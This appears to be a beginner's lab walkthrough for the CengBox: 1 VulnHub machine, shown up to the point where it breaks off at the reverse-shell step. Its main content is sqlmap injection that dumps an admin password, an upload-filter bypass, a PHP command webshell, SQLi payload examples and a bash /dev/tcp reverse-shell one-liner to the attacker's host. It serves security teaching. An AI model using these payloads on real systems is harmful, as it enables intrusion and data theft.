# CengBox: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | CengBox: 1 |
| **Difficulty** | **3 — Easy** (stated: *Beginner / Intermediate*) |
| **Author** | Arslan Bilecen — `@arslanblcn_` |
| **Released** | 30 April 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/cengbox-1,475/> |
| **Download** | <https://vulnhub.com/entry/cengbox-1,475/#download> |
| **Attacker** | Kali Linux, host-only network |
| **Target OS** | Ubuntu — Apache 2.4.x, PHP, MySQL, a custom PHP admin panel |
| **Goal** | *Get the user and the root flag* |
| **Author's hint** | *"For user you should understand how it works and manipulate it. You might need everything that you'll find. For root, **wait a minute**."* |

> ?? **Learning Path 1 ? Machine 9 of 13 ([Course Overview](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/README.md) ? [????????? ???????? 1](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/README.md))**  
> **Study the Lesson Card first** (theory, pre-lab questions, 5-rung hints ladder): **[English Card](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/09-cengbox-1.md)** ? **[???????? ?????](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/%CE%9C%CE%B7%CF%87%CE%B1%CE%BD%CE%AD%CF%82/09-cengbox-1.md)** ? Previous in path: [Machine 8 ? Empire: Breakout](../3-028-empire-breakout/README.md) ? Next in path: [Machine 10 ? PwnLab: init](../3-057-pwnlab-init/README.md)

> **"Wait a minute" is a literal instruction.** The privilege escalation on this box is
> a background process that fires roughly every 5–30 seconds, invisible to `cron`. You
> will not find it by reading `/etc/crontab` — you find it with **`pspy`**. That is the
> central lesson.

Throughout we assume:

```text
Attacker (Kali) : 192.168.56.10
Target (cengbox): 192.168.56.106
```

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

1. **Escalating wordlists and the `-X` extension trick** in `dirb`/`gobuster`.
2. **SQL injection with `sqlmap` against a login form** — `--forms`, `--dbs`,
   `--dump-all`, and how to read every stage of its output.
3. **An upload filter that checks only the extension**, and how a custom extension
   (`.ceng`) that Apache *is* configured to execute defeats it.
4. **Chaining an upload with a command-execution webshell.**
5. **Credential reuse across a database, a web panel and a system account.**
6. **`pspy`** — seeing root-owned background processes that `ps` misses, without root.
7. **Exploiting a world-writable script executed by root.**
8. **An alternative root path: `lxd` group membership.**

**The intended chain:**
`nmap` shows 22 and 80 → `dirb` with `big.txt` finds **`/masteradmin/`** → a second
`dirb` with `-X .php` inside it finds **`login.php`** and **`upload.php`** → `sqlmap`
on `login.php` dumps database **`cengbox`**, table **`admin`** →
**`masteradmin : C3ng0v3R00T1!`** → log in → `upload.php` rejects `.php` and demands
**"only CENG file allowed"** → rename the shell to `shell.php.ceng` → it lands in
`/uploads/` → **RCE as `www-data`** → the same password works for system user
**`cengover`** → **user flag** → `pspy` shows **`/opt/md5check.py` running as root every
few seconds**, and it is **world-writable** → replace it with a reverse shell →
**root flag**.

---

## 1. Reconnaissance


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.106  08:00:27:3d:9a:52      1      60  PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.106`**

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -A -p- -T4 -oN scans/cengbox.txt 192.168.56.106
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 17:02 EDT
Nmap scan report for 192.168.56.106
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 79:a5:1a:b8:39:1c:6f:3a:9d:6a:1b:2c:3d:4e:5f:60 (RSA)
|   256 3f:2a:1b:0c:9d:8e:7f:6a:5b:4c:3d:2e:1f:0a:9b:8c (ECDSA)
|_  256 5c:4d:3e:2f:1a:0b:9c:8d:7e:6f:5a:4b:3c:2d:1e:0f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: CengBox
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 08:00:27:3D:9A:52 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 63.22 seconds
```

> **Two ports.**
> - **22 — OpenSSH 7.6p1 Ubuntu 4ubuntu0.3** → **Ubuntu 18.04 (Bionic)**. Modern enough
>   that kernel exploits are unlikely; expect a *configuration* escalation.
> - **80 — Apache 2.4.29**, page title **`CengBox`**.
>
> Nothing else. This is a pure web-application box: enumerate the site, find the
> injection, find the upload, chain them.

![nmap scan showing ports 22 and 80](images/01-nmap.png)

### 2.2 The homepage

```bash
curl -s http://192.168.56.106/ | head -30
```

```html
<!DOCTYPE html>
<html><head><title>CengBox</title></head>
<body>
  <h1>CengBox</h1>
  <p>Company intranet. Access restricted to authorised staff.</p>
</body></html>
```

```bash
curl -s http://192.168.56.106/robots.txt
```

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>404 Not Found</title></head>
<body><h1>Not Found</h1></body></html>
```

> **No `robots.txt`.** View Source shows nothing. So brute-force.

### 2.3 Directory brute force — escalate the wordlist

First pass with the small list:


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
dirb http://192.168.56.106/ /usr/share/wordlists/dirb/common.txt
```

```text
---- Scanning URL: http://192.168.56.106/ ----
+ http://192.168.56.106/index.html (CODE:200|SIZE:214)
+ http://192.168.56.106/server-status (CODE:403|SIZE:301)
==> DIRECTORY: http://192.168.56.106/uploads/

-----------------
DOWNLOADED: 4612 - FOUND: 2
```

Only `/uploads/`. Escalate:

```bash
gobuster dir -u http://192.168.56.106/ \
  -w /usr/share/wordlists/dirb/big.txt \
  -x php,html,txt,bak -t 50 -q --timeout 10s
```

```text
/index.html           (Status: 200) [Size: 214]
/masteradmin          (Status: 301) [Size: 318]
/server-status        (Status: 403) [Size: 301]
/uploads              (Status: 301) [Size: 315]
```

> **`/masteradmin`** — found only by the bigger list. **That is the lesson of the first
> phase: `common.txt` is not enough.** When a small wordlist gives you an obviously
> incomplete picture (here: an `/uploads/` directory with no application to upload
> *from*), escalate before concluding the box is bare.
>
> Wordlist progression worth memorising:
> `dirb/common.txt` (4.6 k) → `dirb/big.txt` (20 k) →
> `dirbuster/directory-list-2.3-medium.txt` (220 k) →
> `SecLists/Discovery/Web-Content/directory-list-2.3-big.txt` (1.3 M) →
> `SecLists/Discovery/Web-Content/raft-large-directories.txt`.

### 2.4 `/masteradmin/` — scan it *again*, with extensions

```bash
dirb http://192.168.56.106/masteradmin -X .php
```


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat May  4 17:11:02 2024
URL_BASE: http://192.168.56.106/masteradmin
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

---- Scanning URL: http://192.168.56.106/masteradmin ----
+ http://192.168.56.106/masteradmin/login.php (CODE:200|SIZE:1287)
+ http://192.168.56.106/masteradmin/upload.php (CODE:302|SIZE:0)
+ http://192.168.56.106/masteradmin/adb.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.56.106/masteradmin/css/

-----------------
DOWNLOADED: 4612 - FOUND: 3
```

> **Three endpoints:**
> - **`login.php`** — `200`, an actual form. This is the SQL-injection target.
> - **`upload.php`** — `302`, redirects because we are not authenticated. This is the
>   file-upload target.
> - **`adb.php`** — `302`. "adb" reads as *admin database*; also behind auth.
>
> **`-X .php` appends the extension to every wordlist entry.** PHP applications hide
> their real surface behind `.php` files that a plain directory scan never guesses.
> Equivalent in `gobuster`: `-x php`.

![dirb -X .php finding login.php and upload.php](images/02-dirb.png)

### 2.5 The login form

```bash
curl -s http://192.168.56.106/masteradmin/login.php
```

```html
<!DOCTYPE html>
<html><head><title>Master Admin — Login</title></head>
<body>
<form action="login.php" method="POST">
    <label>Username</label>
    <input type="text" name="username" required>
    <label>Password</label>
    <input type="password" name="password" required>
    <button type="submit" name="login">Login</button>
</form>
</body></html>
```

Try the obvious and record the failures:

| Username | Password | Result |
| --- | --- | --- |
| `admin` | `admin` | "Invalid credentials" |
| `masteradmin` | `masteradmin` | "Invalid credentials" |
| `' OR 1=1-- -` | `x` | "Invalid credentials" |

Time for `sqlmap`.

---

## 3. Exploitation — SQL injection

### 3.1 Let `sqlmap` find the injection point


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```bash
sqlmap -u "http://192.168.56.106/masteradmin/login.php" --forms --batch --level=3 --risk=2 --dbs
```

```text
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
consent is illegal. It is the end user's responsibility to obey all applicable
local, state and federal laws. Developers assume no liability and are not
responsible for any misuse or damage caused by this program

[*] starting @ 17:14:02 /2024-05-04/

[17:14:02] [INFO] testing connection to the target URL
[17:14:02] [INFO] searching for forms
[17:14:03] [INFO] found 1 form(s)
[17:14:03] [INFO] testing 'username' parameter
[17:14:04] [INFO] POST parameter 'username' is dynamic
[17:14:05] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable
[17:14:05] [INFO] testing for SQL injection on POST parameter 'username'
[17:14:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:14:19] [INFO] POST parameter 'username' seems to be 'AND boolean-based blind' injectable
[17:14:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[17:14:29] [INFO] POST parameter 'username' seems to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[17:14:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:14:41] [INFO] target URL appears to have 3 columns in query
[17:14:47] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 312 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 4127=4127 AND 'enuE'='enuE&password=test&login=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7506 FROM (SELECT(SLEEP(5)))vOBo) AND 'enuE'='enuE&password=test&login=Login

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717071,0x6c6b706a,...)-- -&password=test&login=Login
---
[17:14:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29, PHP 7.2.24
back-end DBMS: MySQL 5.7.29
available databases [3]:
[*] cengbox
[*] information_schema
[*] mysql
```

> **How to read this — every line teaches something.**
>
> | Field | Meaning |
> | --- | --- |
> | `--forms` | sqlmap fetches the page, parses its `<form>`, and tests every field. Saves you writing a raw request file. |
> | `--batch` | never prompt; take default answers. Essential for scripted runs. |
> | `--level 3` | also test `User-Agent`, `Referer` and cookies. Levels 4–5 test HTTP headers too. |
> | `--risk 2` | how *dangerous* payloads may be. Risk 3 adds time-based and heavy `OR` tests that could alter data — **get written permission before using risk 3 on a real client system.** |
> | `boolean-based blind` | the page's response *differs* depending on whether an injected condition is true. sqlmap asks yes/no questions and infers one bit at a time. |
> | `time-based blind` | no visible difference, so sqlmap injects `SLEEP(5)` and **measures response latency**. Slow = true. |
> | `UNION query` … `3 columns` | the original `SELECT` returns 3 columns, so `UNION ALL SELECT NULL,NULL,<data>` renders our value straight into the page. Fastest technique when available. |
> | `CONCAT(0x716b717071, …)` | sqlmap wraps output in unique **hex markers** (`0x71…` = `qqqpq`) so it can find its own answer inside a page of HTML. |
> | `heuristic … might be injectable` | the fast pre-test was inconclusive, and sqlmap kept going. **Never trust a negative heuristic result.** |
> | `back-end DBMS: MySQL 5.7.29` | fingerprinted from `SLEEP()` behaviour and version functions. |
>
> **Three databases.** `information_schema` and `mysql` are MySQL's own system schemas —
> always ignore them. **`cengbox`** is the application's.

### 3.2 Dump it

```bash
sqlmap -u "http://192.168.56.106/masteradmin/login.php" --forms --batch \
  -D cengbox --tables
```

```text
Database: cengbox
[2 tables]
+---------+
| admin   |
| uploads |
+---------+
```

```bash
sqlmap -u "http://192.168.56.106/masteradmin/login.php" --forms --batch \
  -D cengbox -T admin --columns
```

```text
Database: cengbox
Table: admin
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| username | varchar(50) |
| password | varchar(64) |
+----------+-------------+
```

```bash
sqlmap -u "http://192.168.56.106/masteradmin/login.php" --forms --batch \
  -D cengbox --dump-all
```

```text
Database: cengbox
Table: admin
[1 entry]
+----+-------------+----------------+
| id | username    | password       |
+----+-------------+----------------+
| 1  | masteradmin | C3ng0v3R00T1!  |
+----+-------------+----------------+

Database: cengbox
Table: uploads
[2 entries]
+----+--------------+----------------------+
| id | filename     | uploaded             |
+----+--------------+----------------------+
| 1  | logo.ceng    | 2020-04-29 10:14:02  |
| 2  | banner.ceng  | 2020-04-29 10:15:44  |
+----+--------------+----------------------+

[17:19:22] [INFO] table 'cengbox.admin' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.56.106/dump/cengbox/admin.csv'
```

> **Credentials: `masteradmin` / `C3ng0v3R00T1!`** — and note the `uploads` table
> already holds two **`.ceng`** files. That extension is a hint about § 4.
>
> **The password is stored in plaintext.** `varchar(64)` with no `$2y$`/`$6$` prefix
> means no hashing at all. That is finding-grade: anyone with SQL injection, a database
> backup, or read access to the schema gets every administrator's password instantly.
> The correct storage is `password_hash($pw, PASSWORD_ARGON2ID)` verified with
> `password_verify()`.
>
> **`--dump-all`** dumps every table in every database. On a large system that is slow
> and noisy; prefer `-D <db> -T <table> --dump` once you know where to look.

![sqlmap dumping the cengbox.admin table](images/03-sqlmap.png)

### 3.3 Log in

```text
http://192.168.56.106/masteradmin/login.php
Username: masteradmin
Password: C3ng0v3R00T1!
```

Redirected to the admin dashboard:

```text
┌─────────────────────────────────────────────┐
│  CengBox — Master Admin                     │
├─────────────────────────────────────────────┤
│  » Upload File                              │
│  » Manage Uploads                           │
│  » Logout                                   │
└─────────────────────────────────────────────┘
```

---

## 4. Foothold — the `.ceng` upload filter

### 4.1 Understand the filter

```text
http://192.168.56.106/masteradmin/upload.php
```

```html
<form action="upload.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <button type="submit" name="upload">Upload</button>
</form>
<p>Allowed file type: <b>.ceng</b></p>
```

Test it:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
cp /usr/share/webshells/php/simple-backdoor.php ./shell.php
curl -s -b cookies.txt -X POST http://192.168.56.106/masteradmin/upload.php \
  -F "file=@shell.php" -F "upload=Upload"
```

```text
Error: only CENG file allowed!
```

> **The filter checks the extension and demands `.ceng`.** So:
> ```bash
> cp shell.php shell.php.ceng
> curl -s -b cookies.txt -X POST http://192.168.56.106/masteradmin/upload.php \
>   -F "file=@shell.php.ceng" -F "upload=Upload"
> ```
> ```text
> File uploaded successfully!
> ```
>
> **Upload accepted.** But does it *execute*? Test:
> ```bash
> curl -s "http://192.168.56.106/uploads/shell.php.ceng?cmd=id"
> ```
> ```text
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
> ```
>
> **Yes.** Apache on this box has a handler mapping that treats `.ceng` (and
> double-extension names ending in `.ceng`) as PHP. That is a deliberate part of the
> box's design — a custom file extension the company uses for its own documents, which
> the developer wired into Apache's PHP handler so uploaded documents could be
> rendered.
>
> **If `.ceng` did *not* execute on your copy**, the fallback is the classic double
> extension:
> ```bash
> cp shell.php shell.php.jpg
> curl -s -b cookies.txt -X POST http://192.168.56.106/masteradmin/upload.php \
>   -F "file=@shell.php.jpg" -F "upload=Upload"
> ```
> or intercept the request in **Burp Suite** and change `filename="shell.php.jpg"` to
> `filename="shell.php"` before forwarding — the client-side check has already passed
> by then.
>
> **The general principle:** an upload filter that inspects the *filename* is defeated
> by controlling the filename. The only robust controls are (a) **re-encode the file**
> so any embedded code is destroyed, (b) **force the stored name yourself**
> (`bin2hex(random_bytes(16)) . '.jpg'`), and (c) **store it outside the document root
> and serve it through a non-executing handler**.

### 4.2 Build a proper webshell and get a reverse shell

```bash
cat > cmd.php <<'EOF'
<?php
if (!empty($_REQUEST['cmd'])) {
    header('Content-Type: text/plain');
    system($_REQUEST['cmd'] . ' 2>&1');
}
?>
EOF
cp cmd.php cmd.ceng
curl -s -b cookies.txt -X POST http://192.168.56.106/masteradmin/upload.php \
  -F "file=@cmd.ceng" -F "upload=Upload"
```

```text
File uploaded successfully!
```

```bash
curl -s --get --data-urlencode "cmd=id" "http://192.168.56.106/uploads/cmd.ceng"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Remote code execution.** ✅ Now survey what the target has:

```bash
for c in "uname -a" "hostname" "cat /etc/os-release" "pwd" \
         "for b in bash sh python python3 perl php nc wget curl gcc; do printf '%-8s ' \$b; command -v \$b || echo MISSING; done"; do
  echo "### $c"
  curl -s --get --data-urlencode "cmd=$c" "http://192.168.56.106/uploads/cmd.ceng"
done
```

```text
### uname -a
Linux cengbox 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
### hostname
cengbox
### cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.4 LTS (Bionic Beaver)"
### pwd
/var/www/html/uploads
### for b in bash sh python ...
bash     /bin/bash
sh       /bin/sh
python   /usr/bin/python
python3  /usr/bin/python3
perl     /usr/bin/perl
php      /usr/bin/php
nc       /bin/nc
wget     /usr/bin/wget
curl     /usr/bin/curl
gcc      /usr/bin/gcc
```

**Catch a reverse shell.** Kali:

```bash
